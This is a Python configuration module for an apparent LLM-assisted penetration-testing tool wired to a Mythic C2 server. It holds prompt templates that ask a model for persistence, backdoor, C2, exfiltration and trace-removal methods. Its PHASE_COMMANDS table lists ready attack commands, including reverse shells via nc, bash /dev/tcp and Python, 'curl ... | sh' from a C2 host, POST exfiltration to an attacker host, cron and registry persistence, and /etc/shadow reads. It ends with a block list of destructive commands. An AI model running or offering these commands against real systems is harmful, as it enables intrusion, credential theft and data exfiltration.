""" config with environment variables and general configuration logic."""
# Env variables are combined in nested groups like "Security", "Database" etc.
# So environment variable (case-insensitive) for jwt_secret_key will be
# "security__jwt_secret_key"
#
# Pydantic priority ordering:
#
# 1. (Most important, will overwrite everything) - environment variables
# 2. `.env` file in root folder of project
# 3. Default values
#
# "sqlalchemy_database_uri" is computed field that will
#  create valid database URL
#
# See https://pydantic-docs.helpmanual.io/usage/settings/
# Note, complex types like lists are read as json-encoded strings.


import logging.config
from functools import lru_cache
from pathlib import Path
from pydantic import (
    AnyHttpUrl, BaseModel, Field, HttpUrl,
    SecretStr, computed_field,  # BaseSettings
    )
from pydantic_settings import BaseSettings, SettingsConfigDict
from sqlalchemy.engine.url import URL

PROJECT_DIR = Path(__file__).parent.parent.parent

# global in app settings without validation
LOG_LEVEL: str = "INFO"
DEBUG_MODE_C: bool = False  # CHANGE ME BEFORE RUN


class Security(BaseModel):
    jwt_issuer: str = "my-app"
    jwt_secret_key: SecretStr = SecretStr("sk-change-me")
    jwt_access_token_expire_secs: int = 24 * 3600  # 1d
    refresh_token_expire_secs: int = 28 * 24 * 3600  # 28d
    password_bcrypt_rounds: int = 12
    allowed_hosts: list[str] = ["localhost", "127.0.0.1"]
    backend_cors_origins: list[AnyHttpUrl] = []


class Database(BaseModel):
    hostname: str = "postgres"
    username: str = "postgres"
    password: SecretStr = SecretStr("passwd-change-me")
    port: int = 5432
    db: str = "postgres"


class Mythic(BaseModel):
    server_ip: str = "127.0.0.1"
    username: str = "mythic_admin"
    password: SecretStr = SecretStr("passwd-change-me")
    server_port: int = 7443
    payload_port_http: int = 80
    payload_port_dns: int = 5353
    timeout: int = -1


class LLMservice(BaseModel):
    """ env format like LLMSERVICE__API_URL=http... """
    local: bool = False
    api_url: HttpUrl = "http://localhost:69228"  # Для локального Ollama
    api_key: str = None
    timeout: int = 120
    default_model: str = "mistral"


class Settings(BaseSettings):
    """ only to validate settings by pydantic """
    security: Security = Field(default_factory=Security)
    database: Database = Field(default_factory=Database)
    mythic: Mythic = Field(default_factory=Mythic)
    # if no vars in .env -> take from factory
    llmservice: LLMservice = Field(default_factory=LLMservice)

    @computed_field  # type: ignore[prop-decorator]
    @property
    def sqlalchemy_database_uri(self) -> URL:
        """ setup main db uri to connect """
        return URL.create(
            drivername="postgresql+asyncpg",
            username=self.database.username,
            password=self.database.password.get_secret_value(),
            host=self.database.hostname,
            port=self.database.port,
            database=self.database.db,
        )

    model_config = SettingsConfigDict(
        env_file=f"{PROJECT_DIR}/.env",
        case_sensitive=False,
        env_nested_delimiter="__",
    )


@lru_cache(maxsize=1)
def get_settings() -> Settings:
    return Settings()


def logging_config(log_level: str) -> None:
    """ setup logging format """
    conf = {
        "version": 1,
        "disable_existing_loggers": False,
        "formatters": {
            "verbose": {
                "format": "{asctime} [{levelname}] {name}: {message}",
                "style": "{",
            },
        },
        "handlers": {
            "stream": {
                "class": "logging.StreamHandler",
                "formatter": "verbose",
                "level": "DEBUG",
            },
        },
        "loggers": {
            "": {
                "level": log_level,
                "handlers": ["stream"],
                "propagate": True,
            },
        },
    }
    logging.config.dictConfig(conf)


logging_config(log_level=LOG_LEVEL)

phases = ("Reconnaissance", "Resource Development",
          "Delivery", "Social Engineering",
          "Exploitation", "Persistence", "Defense Evasion",
          "Command & Control", "Pivoting", "Discovery",
          "Privilege Escalation", "Execution", "Credential Access",
          "Lateral Movement", "Collection", "Exfiltration",
          "Impact", "Objectives")

phase_prompts = {
    "recon": """
    You are a penetration testing expert.
    Currently in the reconnaissance phase.
    Based on the provided context, suggest the following actions:

    Context:
    {context}

    Please provide:
    1. Priority reconnaissance targets
    2. Recommended tools and commands
    3. Potential attack vectors
    4. What to look for in results
    5. Next steps

    Respond in JSON format with fields:
    priorities, tools, attack_vectors, what_to_look_for, next_steps
    """,

    "initial_access": """
    You are a penetration testing expert.
    Currently in the initial access phase.
    Based on the provided context, suggest methods for gaining access:

    Context:
    {context}

    Please provide:
    1. Potential access methods
    2. Recommended social engineering techniques
    3. Vulnerabilities to exploit
    4. Tools to use
    5. Next steps

    Respond in JSON format with fields:
    access_methods, social_engineering, vulnerabilities, tools, next_steps
    """,

    "execution": """
    You are a penetration testing expert. Currently in the execution phase.
    Based on the provided context, suggest code execution methods:

    Context:
    {context}

    Please provide:
    1. Code execution methods
    2. Defense evasion techniques
    3. Stealth execution techniques
    4. Tools to use
    5. Next steps

    Respond in JSON format with fields:
    execution_methods, bypass_techniques, stealth_methods, tools, next_steps
    """,

    "persistence": """
    You are a penetration testing expert. Currently in the persistence phase.
    Based on the provided context, suggest access persistence methods:

    Context:
    {context}

    Please provide:
    1. Persistence methods
    2. Stealth techniques
    3. Resilient backdoors
    4. Tools to use
    5. Next steps

    Respond in JSON format with fields:
    persistence_methods, stealth_techniques, backdoors, tools, next_steps
    """,

    "privilege_escalation": """
    You are a penetration testing expert.
    Currently in the privilege escalation phase.
    Based on the provided context, suggest privilege escalation methods:

    Context:
    {context}

    Please provide:
    1. Escalation methods
    2. Kernel vulnerabilities
    3. Configuration misconfigurations
    4. Tools to use
    5. Next steps

    Respond in JSON format with fields:
    escalation_methods, kernel_vulnerabilities, misconfigurations,
    tools, next_steps
    """,

    "discovery": """
    You are a penetration testing expert. Currently in the discovery phase.
    Based on the provided context, suggest information gathering methods:

    Context:
    {context}

    Please provide:
    1. System information gathering methods
    2. Network resource discovery
    3. Account and group discovery
    4. Tools to use
    5. Next steps

    Respond in JSON format with fields:
    system_info_methods, network_discovery, account_discovery,
    tools, next_steps
    """,

    "lateral_movement": """
    You are a penetration testing expert.
    Currently in the lateral movement phase.
    Based on the provided context, suggest network movement methods:

    Context:
    {context}

    Please provide:
    1. Movement methods
    2. Network traversal techniques
    3. Credential usage techniques
    4. Tools to use
    5. Next steps

    Respond in JSON format with fields:
    movement_methods, network_techniques, credential_usage,
    tools, next_steps
    """,

    "collection": """
    You are a penetration testing expert. Currently in the collection phase.
    Based on the provided context, suggest data collection methods:

    Context:
    {context}

    Please provide:
    1. Data collection methods
    2. Target data types
    3. Exfiltration techniques
    4. Tools to use
    5. Next steps

    Respond in JSON format with fields:
    collection_methods, target_data_types, exfiltration_techniques,
    tools, next_steps
    """,

    "command_and_control": """
    You are a penetration testing expert.
    Currently in the command and control phase.
    Based on the provided context, suggest C2 methods:

    Context:
    {context}

    Please provide:
    1. C2 communication methods
    2. Traffic obfuscation techniques
    3. Protocols to use
    4. Tools to use
    5. Next steps

    Respond in JSON format with fields:
    c2_methods, traffic_obfuscation, protocols, tools, next_steps
    """,

    "exfiltration": """
    You are a penetration testing expert. Currently in the exfiltration phase.
    Based on the provided context, suggest data exfiltration methods:

    Context:
    {context}

    Please provide:
    1. Data exfiltration methods
    2. Defense bypass techniques
    3. Data transfer channels
    4. Tools to use
    5. Next steps

    Respond in JSON format with fields:
    exfiltration_methods, bypass_techniques, data_channels, tools, next_steps
    """,

    "impact": """
    You are a penetration testing expert. Currently in the impact phase.
    Based on the provided context, suggest impact methods:

    Context:
    {context}

    Please provide:
    1. System impact methods
    2. Availability attack techniques
    3. Trace removal methods
    4. Tools to use
    5. Next steps

    Respond in JSON format with fields:
    impact_methods, availability_attacks, trace_removal, tools, next_steps
    """
}

PHASE_COMMANDS = {
    "Reconnaissance": [
        "nmap -sn <target>",
        "whois <domain>",
        "nslookup <domain>",
        "dig <domain>",
    ],
    "Resource Development": [
        "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o payload.exe",
        "python3 -m http.server 8000",
    ],
    "Delivery": [
        "curl -T payload.exe ftp://<ip>/uploads/",
        "smbclient //target/share -U user%pass -c 'put payload.exe'",
    ],
    "Social Engineering": [
        "swaks --to user@example.com --from admin@example.com --server smtp.example.com --body 'Click here: http://evil.com'",
    ],
    "Exploitation": [
        "msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; run'",
        "sqlmap -u 'http://target/vuln.php?id=1' --batch --dump",
    ],
    "Persistence": [
        "crontab -l && echo '*/5 * * * * /tmp/payload' | crontab -",
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"C:\\Users\\Public\\payload.exe\"",
    ],
    "Defense Evasion": [
        "upx payload.exe",
        "chattr +i /tmp/hidden_file",
    ],
    "Command & Control": [
        "nc -e /bin/sh <ip> <port>",
        "curl -s http://c2.server/beacon | sh",
    ],
    "Pivoting": [
        "ssh -D 9090 user@pivot-host",
        "proxychains nmap -sT -Pn 192.168.1.0/24",
    ],
    "Discovery": [
        "ps aux",
        "netstat -tulnp",
        "cat /etc/passwd",
        "arp -a",
    ],
    "Privilege Escalation": [
        "sudo -l",
        "find / -perm -4000 2>/dev/null",
        "cat /etc/shadow",
    ],
    "Execution": [
        "bash -i >& /dev/tcp/<ip>/<port> 0>&1",
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<ip>\",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
    ],
    "Credential Access": [
        "mimikatz.exe",
        "hashcat -m 1000 hashes.txt wordlist.txt",
    ],
    "Lateral Movement": [
        "psexec.py user@target 'cmd.exe'",
        "evil-winrm -i <ip> -u user -p pass",
    ],
    "Collection": [
        "tar czf /tmp/data.tar.gz /home/user/Documents/",
        "find / -name \"*.docx\" -type f 2>/dev/null",
    ],
    "Exfiltration": [
        "scp /tmp/data.tar.gz user@remote:/tmp/",
        "base64 /tmp/data.tar.gz | curl -X POST -d @- http://attacker.exfil.net",
    ],
    "Impact": [
        "rm -rf /important/data",
        "shutdown -h now",
    ],
    "Objectives": [
        "cat /flag.txt",
        "echo 'Mission Complete' > /root/success.log",
    ],
}

UNSAFE_CMD = ["rm -fr /", "dd if=/dev/zero of=", "chown -R root:root /",
              "rm -rf /", ":(){ :|:& };:", "rm -rf *"]
